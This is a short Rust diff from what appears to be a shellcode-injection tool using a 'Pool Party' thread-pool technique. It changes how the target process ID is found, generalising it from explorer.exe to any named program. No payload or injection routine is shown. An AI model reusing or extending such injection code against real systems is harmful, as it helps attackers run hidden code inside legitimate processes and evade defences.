@@ -12,12 +12,7 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     #[cfg(feature = "debug")]
     crate::utils::print_message("Executing via Pool Party...");
     
-    let pid = if target_program.to_lowercase().contains("explorer.exe") {
-        // Try to find existing explorer process first
-        crate::utils::remote::get_process_id_by_name("explorer.exe")
-    } else {
-        None
-    };
+    let pid = crate::utils::remote::get_process_id_by_name(target_program)?;
 
     let process_id = if let Some(existing_pid) = pid {
         existing_pid
